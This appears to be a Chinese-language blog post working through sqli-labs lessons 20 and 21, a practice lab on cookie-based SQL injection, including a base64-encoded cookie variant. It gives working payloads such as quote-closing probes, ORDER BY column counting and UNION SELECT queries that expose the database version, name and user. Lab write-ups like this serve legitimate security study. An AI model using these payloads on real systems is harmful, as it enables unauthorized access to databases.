---
title: sqli labs lesson 20~21 学习
date: 2016-08-31 17:05:21
tags:
- 渗透测试
- SQL 注入
categories: SQL 注入
---
为了找工作，前几天重温了下背包九讲，现在继续学习sql注入。
<!-- more -->
# 1 lesson 20 cookie注入-基于错误
此时，无论用户名、密码以什么格式输入，在后面加单引号'，双引号"，注释符#，页面都不会报错。

在页面上输入普通用户 用户名和密码之后，显示如下
![](https://ww4.sinaimg.cn/large/005CA6ZCgw1f7fkm2fcwxj30zn0a9q7f.jpg)

USER AGENT,cookie,username,password,id等信息显示在页面上

# 1.1 测试cookie
使用 EditThisCookie 插件查看cookie值
![](https://ww2.sinaimg.cn/large/005CA6ZCgw1f7fkqai00tj30fm0ardgv.jpg)

cookie 值为 Dumb，编辑cookie，观察页面显示：
在 Dumb 后面添加单引号 ', 即 cookie 值为 `Dumb'`
然后刷新页面
![](https://ww4.sinaimg.cn/large/005CA6ZCgw1f7fks7dy43j311r09d0xy.jpg)
出现错误：`Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''Dumb'' LIMIT 0,1' at line 1`


cookie 值：`Dumb"`
![](https://ww4.sinaimg.cn/large/005CA6ZCgw1f7fku8u59qj31000ggdma.jpg)
提示不太友好，就不解释了~~~~~
总之没有语法错误。

初步断定 <font color="red"> cookie 是以单引号' 闭合的</font>

cookie 值 | 页面情况
-- | --
`Dumb'#`  | 页面显示正常
`Dumb' order by 5#`  | 语法错误
`Dumb' order by 1#`  | 正常
`Dumb' order by 3#`  | 正常
`Dumb' order by 4#`  | 语法错误

<font color="red">说明sql语句有三个字段</font>

## 1.2 获取数据库信息
cookie 值：`' union select version(),database(),user()#`
![](https://ww4.sinaimg.cn/large/005CA6ZCgw1f7fl5zdbnkj310n0a2gqm.jpg)
页面显示
- 数据库版本：5.6.17
- 数据库名：security
- 用户名：root@localhost

其他数据库信息的获取方式，参加 [sqli labs lesson 1~4 学习](http://huirong.github.io/2016/08/24/sqli-labs-series-lesson1-4/) lesson 1

# 2 lesson 21 cookie注入-基于错误
## 2.1 测试
- 在页面输入 用户名：Dumb 密码：Dumb 后
- cookie 值：RHVtYg==
- 备注：可能是浏览器上看到的 cookie 值为：RHVtYg%3D%3D，因为 == 浏览器进行url编码后为 %3D

无论怎么使用 lesson 20 的方式修改cookie都没有用
使用 base 64 解密 cookie
![](https://ww1.sinaimg.cn/large/005CA6ZCgw1f7ii7z0ugzj30eq099dgi.jpg)
解密后的结果为 Dumb，说明cookie是经过base 64加密的。

## 2.2 闭合类型
将 `Dumb\` 进行base64加密
![](https://ww3.sinaimg.cn/large/005CA6ZCgw1f7iie2bw5uj30eq09zgmc.jpg)


然后EditThisCookie，将cookie修改为加密后的值
![](https://ww4.sinaimg.cn/large/005CA6ZCgw1f7iiepfhe8j30fm0cgwg4.jpg)


刷新页面
![](https://ww3.sinaimg.cn/large/005CA6ZCgw1f7iifome6uj311p08sgqk.jpg)

页面出现如下错误：
`Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''Dumb\') LIMIT 0,1' at line 1`

说明 sql 语句是以 `('')` 闭合的。

## 2.2 注入
将 `') union select database(),version(),version() #`  进行base64加密
![](https://ww4.sinaimg.cn/large/005CA6ZCgw1f7iij6a57wj30eq094t9s.jpg)

![](https://ww3.sinaimg.cn/large/005CA6ZCgw1f7iijffkzmj30fm0cg0ul.jpg)

![](https://ww4.sinaimg.cn/large/005CA6ZCgw1f7iijuq7ntj31160bkwk1.jpg)

页面上显示出数据库，MySQL版本等信息。
其他数据库信息的获取方式，参加 [sqli labs lesson 1~4 学习](http://huirong.github.io/2016/08/24/sqli-labs-series-lesson1-4/) lesson 1

# 3 后记
sqli labs 的学习就先告一段落，等找完工作，继续学习，顺便把中间没有博客的 lesson 18 和 lesson 19 补上。












